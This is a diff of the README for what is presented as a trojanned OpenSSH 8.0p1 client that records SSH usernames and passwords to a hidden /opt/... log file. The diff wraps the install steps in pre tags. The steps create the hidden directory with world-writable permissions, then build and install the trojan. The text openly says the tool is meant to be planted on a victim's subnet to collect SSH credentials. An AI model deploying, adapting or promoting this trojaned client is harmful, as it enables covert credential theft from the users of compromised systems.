@@ -2,6 +2,7 @@
 This is trojanned version of openssh-8.0p1, the ssh client will log ssh username and ssh password into /opt/.../log.txt
 
 # INSTALLATION
+<pre>
 sudo mkdir -p /opt/...
 sudo chmod 777 /opt/...
 
@@ -10,6 +11,7 @@ cd openssh8_trojanned
 ./configure
 make
 sudo make install
+</pre>
 
 # WHAT THE HELL IS THIS ?
 this trojanned version of openssh can be installed on a victim's subnet which has many ssh accesses. 
